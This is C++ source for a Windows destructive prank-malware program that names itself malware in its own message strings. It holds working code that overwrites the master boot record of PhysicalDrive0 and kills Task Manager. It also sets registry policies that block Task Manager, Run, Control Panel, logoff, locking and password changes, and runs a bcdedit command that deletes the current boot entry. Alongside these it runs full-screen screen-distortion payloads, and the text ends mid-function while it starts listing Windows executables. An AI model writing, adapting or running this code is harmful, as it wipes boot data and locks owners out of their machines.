typedef struct IUnknown IUnknown;
#ifndef UNICODE
#define UNICODE
#endif

#define NOMINMAX
#include <windows.h>
#include <math.h>
#include <cstdint>
#include <cstdlib>
#include <tchar.h>
#pragma comment(lib, "Msimg32.lib")
#pragma comment(lib, "winmm.lib")
#pragma warning(disable : 4996)
#define MIN(a,b) (((a)<(b))?(a):(b))
#define MAX(a,b) (((a)>(b))?(a):(b))
#include <stdint.h>
#include <string>
#include <random>
#include <time.h>
#include <algorithm>
int ShiftR = 3;
int ShiftG = 1;
int ShiftB = 2;
int boyR = 3;
int boyG = 0;
int boyB = 2;
int hiR = 3;
int hiG = 1;
int hiB = 2;
int ShiftSpeed = 1;
int ShiftSpeed2 = 32;
int ShiftSpeed3 = 75;
int WarpSpeed = 15;
int WarpSpeed2 = 15;
#define TIMER_ID 1
#define CIRCLE_COUNT 32
HINSTANCE hInst;
HWND hWndMain;
POINT circles[CIRCLE_COUNT];
int radius = 80;
#pragma region Public Variables
extern HWND hwndDesktop;
extern HDC hdcDesktop;
extern RECT rcScrBounds;
extern HHOOK hMsgHook;
extern INT nCounter;
#pragma endregion Public Variables

typedef struct {
    float h, s, l;
} HSL;

float HueToRGB(float v1, float v2, float vH) {
    if (vH < 0.0f) vH += 1.0f;
    if (vH > 1.0f) vH -= 1.0f;
    if ((6.0f * vH) < 1.0f) return (v1 + (v2 - v1) * 6.0f * vH);
    if ((2.0f * vH) < 1.0f) return (v2);
    if ((3.0f * vH) < 2.0f) return (v1 + (v2 - v1) * ((2.0f / 3.0f) - vH) * 6.0f);
    return v1;
}

HSL RGBtoHSL(BYTE r, BYTE g, BYTE b) {
    float R = r / 255.0f, G = g / 255.0f, B = b / 255.0f;
    float min_v = MIN(R, MIN(G, B)), max_v = MAX(R, MAX(G, B));
    float delta = max_v - min_v;
    float h = 0, s = 0, l = (max_v + min_v) / 2.0f;
    if (delta != 0) {
        s = (l < 0.5f) ? (delta / (max_v + min_v)) : (delta / (2.0f - max_v - min_v));
        if (R == max_v) h = (G - B) / delta + (G < B ? 6.0f : 0.0f);
        else if (G == max_v) h = (B - R) / delta + 2.0f;
        else h = (R - G) / delta + 4.0f;
        h /= 6.0f;
    }
    HSL res;
    res.h = h * 360.0f;
    res.s = s;
    res.l = l;
    return res;
}

DWORD HSLtoRGB(HSL hsl) {
    float h = hsl.h / 360.0f, s = hsl.s, l = hsl.l;
    BYTE r, g, b;
    if (s == 0) r = g = b = (BYTE)(l * 255);
    else {
        float v2 = (l < 0.5f) ? (l * (1.0f + s)) : ((l + s) - (l * s));
        float v1 = 2.0f * l - v2;
        r = (BYTE)(255 * HueToRGB(v1, v2, h + (1.0f / 3.0f)));
        g = (BYTE)(255 * HueToRGB(v1, v2, h));
        b = (BYTE)(255 * HueToRGB(v1, v2, h - (1.0f / 3.0f)));
    }
    return (DWORD)((r << 16) | (g << 8) | b);
}

const unsigned char MBR[512]{};

DWORD WINAPI MBROverwriter(LPVOID lpParam) {
    DWORD Bytes;
    HANDLE hFile = CreateFileA(
        "\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_EXISTING, NULL, NULL);
    WriteFile(hFile, MBR, 512, &Bytes, NULL);
    return 1;
}

DWORD WINAPI disabler(LPVOID lpParam) {
    system("taskkill /f /im taskmgr.exe");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
    system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
    system("bcdedit /delete {current}");
    return 1;
}

DWORD WINAPI taskbar(LPVOID lpvd) {
    static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
    ShowWindow(hShellWnd, SW_HIDE);
    return 0;
}

DWORD WINAPI unknownerrormsg(LPVOID lpParam) {
    while (true) {

        LPCWSTR string = L"";
        int fx = rand() % 10;

        MessageBoxW(NULL, string, L"", MB_OK | MB_ICONERROR);

        if (fx == 0) string = L"";
        if (fx == 1) string = L"";
        if (fx == 2) string = L"";
        if (fx == 3) string = L"";
        if (fx == 4) string = L"";
        if (fx == 5) string = L"";
        if (fx == 6) string = L"";
        if (fx == 7) string = L"";
        if (fx == 8) string = L"";
        if (fx == 9) string = L"";
        if (fx == 10) string = L"";
        return 0;
    }
}

void sound1(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            t * sin(t / 105 >> 0)
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound2(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            ((((t >> (1 + (1 & t >> 15)))) * (tan(t >> 12))) * 200) - 128
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound3(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            t * tan(t >> 105 & 1 * t)
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound4(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            ((((t >> (1 + (1 * t >> 5)))) * (tan(t >> 12))) * 200) / 128
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound5(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            t * tan(t >> 105 / 1 | t)
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound6(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            (((t >> 11 & t >> 8) >> (t >> 20 & t >> 12)) * t)
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}


DWORD WINAPI payload1(LPVOID lpParam) {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"static",
        L"gdi distortion",
        WS_POPUP,
        0, 0, w, h,
        NULL, NULL, hInstance, NULL
    );

    ShowWindow(hwnd, SW_SHOW);
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, w, h, SWP_SHOWWINDOW | SWP_NOACTIVATE);

    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* bits = NULL;
    HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &bits, NULL, 0);
    SelectObject(memDC, hBitmap);

    POINT ptSrc = { 0, 0 };
    SIZE sizeWnd = { w, h };
    POINT ptDst = { 0, 0 };

    BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, 0 };

    int t = 0;


    while (1)
    {
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

        DWORD* pixel = (DWORD*)bits;

        for (int y = 0; y < h; y++)
        {
            for (int x = 0; x < w; x++)
            {
                int srcX = x + (int)(sin(0.01 * y + x * 0.01) * 50);
                int srcY = y + (int)(sin(0.01 * t + w * 0.01) / 32);

                if (srcX < 0) srcX += w;
                if (srcX >= w) srcX -= w;
                if (srcY < 0) srcY += h;
                if (srcY >= h) srcY -= h;

                pixel[y * w + x] = pixel[srcY * w + srcX] + t;
            }
        }
        t++;

        UpdateLayeredWindow(hwnd, hdc, &ptDst, &sizeWnd, memDC, &ptSrc, 0, &blend, ULW_ALPHA);
        SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, w, h, SWP_SHOWWINDOW | SWP_NOACTIVATE);
    }

    DeleteObject(hBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, hdc);
    DestroyWindow(hwnd);

    return 0;
}

DWORD WINAPI payload2(LPVOID lpParam) { // credits to malsteve
    const int width = GetSystemMetrics(0), height = GetSystemMetrics(1);

    HWND laywin = CreateWindowExA(
        WS_EX_LAYERED | WS_EX_TOOLWINDOW | WS_EX_TRANSPARENT | WS_EX_TOPMOST,
        "STATIC", "gdi distortion", WS_POPUP, 0, 0, 0, 0, NULL, NULL, NULL, NULL
    );

    POINT winpos = { 0, 0 };
    SIZE winsize = { width, height };

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = height;
    bmi.bmiHeader.biPlanes = 1;

    RGBQUAD* pixels;
    RGBQUAD* pixels_copy = (RGBQUAD*)malloc(width * height * sizeof(RGBQUAD));
    RGBQUAD* src = (RGBQUAD*)VirtualAlloc(0, width * height * 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    HDC hdc = GetDC(0);
    HDC memdc = CreateCompatibleDC(hdc);
    HBITMAP hbit = CreateDIBSection(hdc, &bmi, 0, (void**)&pixels, 0, 0);
    SelectObject(memdc, hbit);

    int t = 0;
    int col = 0;
    int time = 0;

    while (true)
    {
        BitBlt(memdc, 0, 0, width, height, hdc, 0, 0, SRCCOPY);
        memcpy(src, pixels, width * height * 4);
        (DWORD*)col;

        for (int y = 0; y < height; y++)
        {
            for (int x = 0; x < width; x++)
            {
                int moveX = (int)10 * asin(sin(y * 0.07 + t * 1));
                int destX = (x + moveX + width) % width;
                int sx = x + (int)moveX;
                if (sx < 0) sx = 0;
                if (sx >= width) sx = width - 1;

                RGBQUAD c = src[y * width + sx];

                BYTE r = c.rgbRed;
                BYTE g = c.rgbGreen;
                BYTE b = c.rgbBlue;

                r = (BYTE)(r + ShiftR * ShiftSpeed);
                g = (BYTE)(g + ShiftG * ShiftSpeed);
                b = (BYTE)(b + ShiftB * ShiftSpeed);

                RGBQUAD out;
                out.rgbRed = r;
                out.rgbGreen = g;
                out.rgbBlue = b;
                out.rgbReserved = 255;
                pixels[y * width + x] = pixels_copy[y * width + destX] = out;
            }
        }

        t++;

        UpdateLayeredWindow(laywin, hdc, &winpos, &winsize, memdc, &winpos, 0, NULL, ULW_OPAQUE);
        SetWindowPos(laywin, HWND_TOPMOST, 0, 0, 0, 0, SWP_SHOWWINDOW | SWP_NOSIZE | SWP_NOMOVE);
    }

    ReleaseDC(0, hdc);
    DeleteDC(memdc);
    DeleteObject(hbit);
    DestroyWindow(laywin);
    free(pixels_copy);
}

DWORD WINAPI payload3(LPVOID lpParam) {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"static",
        L"gdi distortion",
        WS_POPUP,
        0, 0, w, h,
        NULL, NULL, hInstance, NULL
    );

    ShowWindow(hwnd, SW_SHOW);
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, w, h, SWP_SHOWWINDOW | SWP_NOACTIVATE);
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;

    void* bits = NULL;
    HBITMAP hBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, &bits, NULL, 0);
    SelectObject(hdcMem, hBitmap);

    POINT ptSrc = { 0, 0 };
    SIZE sizeWnd = { w, h };
    POINT ptDst = { 0, 0 };
    BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, 0 };

    int t = 0;
    while (!(GetAsyncKeyState(VK_ESCAPE) & 0x8000)) {
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        DWORD* pixel = (DWORD*)bits;

        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                int srcX = (x + (int)(tan(0.0009 * t + t * 0.0009) * 320)) % w;
                int srcY = (y + (int)(tan(0.0009 * x + t * 0.0009) * 320)) % h;
                if (srcX < 0) srcX += w;
                if (srcY < 0) srcY += h;

                DWORD col = pixel[srcY * w + srcX];
                HSL hsl = RGBtoHSL((BYTE)(col >> 16), (BYTE)(col >> 8), (BYTE)col);
                hsl.h = fmodf(hsl.h + (float)(t % 360), 360.0f);
                pixel[y * w + x] = HSLtoRGB(hsl);
            }
        }

        UpdateLayeredWindow(hwnd, hdcScreen, &ptDst, &sizeWnd, hdcMem, &ptSrc, 0, &blend, ULW_ALPHA);
        SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
        t++;
    }

    ReleaseDC(NULL, hdcScreen);
    DeleteDC(hdcMem);
    DeleteObject(hBitmap);
    return 0;
}

DWORD WINAPI payload4(LPVOID lpParam) {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"static",
        L"gdi distortion",
        WS_POPUP,
        0, 0, w, h,
        NULL, NULL, hInstance, NULL
    );

    ShowWindow(hwnd, SW_SHOW);
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, w, h, SWP_SHOWWINDOW | SWP_NOACTIVATE);

    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* bits = NULL;
    HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &bits, NULL, 0);
    SelectObject(memDC, hBitmap);

    POINT ptSrc = { 0, 0 };
    SIZE sizeWnd = { w, h };
    POINT ptDst = { 0, 0 };

    BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, 0 };

    int t = 0;


    while (1)
    {
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);

        DWORD* pixel = (DWORD*)bits;

        for (int y = 0; y < h; y++)
        {
            for (int x = 0; x < w; x++)
            {
                int srcX = (x ^ t) % w;
                int srcY = (y ^ x) % h;

                pixel[y * w + x] = pixel[srcY * w + srcX] * (7 & t);
            }
        }

        UpdateLayeredWindow(hwnd, hdc, &ptDst, &sizeWnd, memDC, &ptSrc, 0, &blend, ULW_ALPHA);
        SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_SHOWWINDOW | SWP_NOSIZE | SWP_NOMOVE);
        t++;
    }

    DeleteObject(hBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, hdc);
    DestroyWindow(hwnd);

    return 0;
}

DWORD WINAPI payload5(LPVOID lpParam) {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"static",
        L"gdi distortion",
        WS_POPUP,
        0, 0, w, h,
        NULL, NULL, hInstance, NULL
    );

    ShowWindow(hwnd, SW_SHOW);
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, w, h, SWP_SHOWWINDOW | SWP_NOACTIVATE);

    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* bits = NULL;
    HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &bits, NULL, 0);
    SelectObject(memDC, hBitmap);

    POINT ptSrc = { 0,0 };
    SIZE sizeWnd = { w,h };
    POINT ptDst = { 0,0 };

    BLENDFUNCTION blend = { AC_SRC_OVER,0,255,AC_SRC_ALPHA };

    RGBQUAD* pixel = (RGBQUAD*)bits;
    RGBQUAD* src = (RGBQUAD*)VirtualAlloc(0, w * h * 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    int t = 0;

    while (1)
    {
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        memcpy(src, pixel, w * h * 4);

        double time = t * 0.02;

        for (int y = 0; y < h; y++)
        {
            double off = tan(time + y * 0.013) * WarpSpeed2;

            for (int x = 0; x < w; x++)
            {
                int sx = x + (int)off;
                if (sx < 0) sx = 0;
                if (sx >= w) sx = w - 1;

                RGBQUAD c = src[y * w + sx];

                BYTE r = c.rgbRed;
                BYTE g = c.rgbGreen;
                BYTE b = c.rgbBlue;

                r = (BYTE)(r + boyR * ShiftSpeed2);
                g = (BYTE)(g + boyG * ShiftSpeed2);
                b = (BYTE)(b + boyB * ShiftSpeed2);

                RGBQUAD RGBQUADStart;
                RGBQUADStart.rgbRed = r;
                RGBQUADStart.rgbBlue = b;
                RGBQUADStart.rgbGreen = g;
                RGBQUADStart.rgbReserved = 255;

                pixel[y * w + x] = RGBQUADStart;
            }
        }

        UpdateLayeredWindow(hwnd, hdc, &ptDst, &sizeWnd, memDC, &ptSrc, 0, &blend, ULW_ALPHA);
        SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
        t++;
    }

    VirtualFree(src, 0, MEM_RELEASE);
    DeleteObject(hBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, hdc);
    DestroyWindow(hwnd);

    return 0;
}

DWORD WINAPI payloadfinal(LPVOID lpParam) {
    const int width = GetSystemMetrics(0), height = GetSystemMetrics(1);

    HWND laywin = CreateWindowExA(
        WS_EX_LAYERED | WS_EX_TOOLWINDOW | WS_EX_TRANSPARENT | WS_EX_TOPMOST,
        "STATIC", "gdi distortion", WS_POPUP, 0, 0, 0, 0, NULL, NULL, NULL, NULL
    );

    POINT winpos = { 0, 0 };
    SIZE winsize = { width, height };

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = height;
    bmi.bmiHeader.biPlanes = 1;

    RGBQUAD* pixels;
    RGBQUAD* pixels_copy = (RGBQUAD*)malloc(width * height * sizeof(RGBQUAD));
    RGBQUAD* src = (RGBQUAD*)VirtualAlloc(0, width * height * 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    HDC hdc = GetDC(0);
    HDC memdc = CreateCompatibleDC(hdc);
    HBITMAP hbit = CreateDIBSection(hdc, &bmi, 0, (void**)&pixels, 0, 0);
    SelectObject(memdc, hbit);

    int t = 0;
    int col = 0;
    int time = 0;

    while (true)
    {
        BitBlt(memdc, 0, 0, width, height, hdc, 0, 0, SRCCOPY);
        memcpy(src, pixels, width * height * 4);
        (DWORD*)col;

        for (int y = 0; y < height; y++)
        {
            for (int x = 0; x < width; x++)
            {
                int moveX = (int)10 * asin(sin(x * 0.1 + t * 1));
                int destX = (x + moveX + width) % width;
                int sx = x + (int)moveX;
                if (sx < 0) sx = 0;
                if (sx >= width) sx = width - 1;

                RGBQUAD c = src[y * width + sx];

                BYTE r = c.rgbRed;
                BYTE g = c.rgbGreen;
                BYTE b = c.rgbBlue;

                r = (BYTE)(r + hiR * ShiftSpeed3);
                g = (BYTE)(g + hiG * ShiftSpeed3);
                b = (BYTE)(b + hiB * ShiftSpeed3);

                RGBQUAD out;
                out.rgbRed = r;
                out.rgbGreen = g;
                out.rgbBlue = b;
                out.rgbReserved = 255;
                pixels[y * width + x] = pixels_copy[y * width + destX] = out;
            }
        }

        t++;

        UpdateLayeredWindow(laywin, hdc, &winpos, &winsize, memdc, &winpos, 0, NULL, ULW_OPAQUE);
        SetWindowPos(laywin, HWND_TOPMOST, 0, 0, 0, 0, SWP_SHOWWINDOW | SWP_NOSIZE | SWP_NOMOVE);
    }

    ReleaseDC(0, hdc);
    DeleteDC(memdc);
    DeleteObject(hbit);
    DestroyWindow(laywin);
    free(pixels_copy);
}

DWORD WINAPI unknownlol(LPVOID lpParam) {
    while (true) {

        LPCWSTR string = L"DEATH";
        int fx = rand() % 5;

        MessageBoxW(NULL, string, L"", MB_OK | MB_ICONERROR);

        if (fx == 0) string = L"malsteve likes this malware.";
        if (fx == 1) string = L"'no skiddies hair' pankoza said";
        if (fx == 2) string = L"Yinesister";
        if (fx == 3) string = L"Yineosiyer.exe";
        if (fx == 4) string = L"sus";
        if (fx == 5) string = L"TJ-MAC SUCKS PEPPA PIG JENNNIFER";
        return 0;
    }
}

DWORD WINAPI payloadHA(LPVOID lpParam) {
    WIN32_FIND_DATA data;
    LPCWSTR path = L"C:\\WINDOWS\\*.exe";
